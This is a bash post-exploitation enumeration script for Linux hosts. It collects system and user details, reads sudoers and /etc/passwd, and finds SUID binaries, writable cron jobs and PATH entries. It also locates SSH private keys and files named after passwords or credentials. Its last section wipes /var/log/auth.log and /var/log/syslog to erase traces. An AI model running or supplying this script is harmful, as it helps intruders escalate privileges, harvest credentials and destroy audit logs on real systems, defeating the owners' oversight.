#!/bin/bash
# Function to print section headers
print_header() {
    echo -e "\n\033[1;34m[+] $1\033[0m"
    echo "------------------------------------"
}

# 1. System Information
print_header "Gathering System Information"
echo "[*] OS Version:"
cat /etc/os-release
echo "[*] Kernel Version:"
uname -a
echo "[*] Uptime:"
uptime
echo "[*] Installed Patches:"
if command -v dpkg &> /dev/null; then
    dpkg -l | grep -i security
elif command -v rpm &> /dev/null; then
    rpm -qa | grep -i security
else
    echo "Package manager not found!"
fi

# 2. User Enumeration
print_header "Enumerating Users & Privileges"
echo "[*] Current User: $(whoami)"
echo "[*] Users Currently Logged In:"
who
echo "[*] Last Logged In Users:"
last -n 10
echo "[*] Users with UID 0 (Potential Root Users):"
awk -F: '($3 == 0) {print}' /etc/passwd
echo "[*] Sudoers Configuration:"
cat /etc/sudoers 2>/dev/null | grep -v '#'

# 3. Privilege Escalation Checks
print_header "Checking Privilege Escalation Paths"
echo "[*] Sudo Privileges:"
sudo -l
echo "[*] Checking for SUID Binaries:"
find / -perm -4000 -type f 2>/dev/null
echo "[*] Checking for Writable /etc/passwd and /etc/shadow:"
ls -l /etc/passwd /etc/shadow
echo "[*] Checking for Writable Cron Jobs:"
find /etc/cron* -type f -writable 2>/dev/null
echo "[*] Checking for Weak File Permissions in Home Directories:"
find /home -maxdepth 2 -type f -perm -o+w 2>/dev/null
echo "[*] Checking for Writable Scripts in PATH:"
# Split PATH on : into an array rather than on whitespace, so a directory with
# a space in it is still searched as one path.
IFS=: read -ra path_dirs <<< "$PATH"
find "${path_dirs[@]}" -type f -writable 2>/dev/null

# 4. Lateral Movement
print_header "Finding Lateral Movement Opportunities"
echo "[*] Checking SSH Keys:"
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null
echo "[*] Checking for Active SSH Sessions:"
ss -tuna | grep ":22 "
echo "[*] Checking Network Shares:"
showmount -e localhost 2>/dev/null
echo "[*] Checking for Active Network Connections:"
netstat -tulnp

# 5. Persistence Mechanisms
print_header "Checking for Persistence Mechanisms"
echo "[*] Checking for Startup Scripts in /etc/init.d/:"
ls -lah /etc/init.d/
echo "[*] Checking for Suspicious Cron Jobs:"
crontab -l 2>/dev/null
echo "[*] Checking for User Auto-Login:"
cat /etc/passwd | grep -v "nologin"

# 6. Data Extraction & Log Clearing
print_header "Finding Sensitive Files & Clearing Logs"
echo "[*] Searching for Password Files:"
find / -name "*password*" -o -name "*cred*" -o -name "*login*" 2>/dev/null
echo "[*] Clearing Logs:"
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/syslog

echo -e "\n\033[1;32m[+] Basic ENUM Execution Completed!\033[0m"

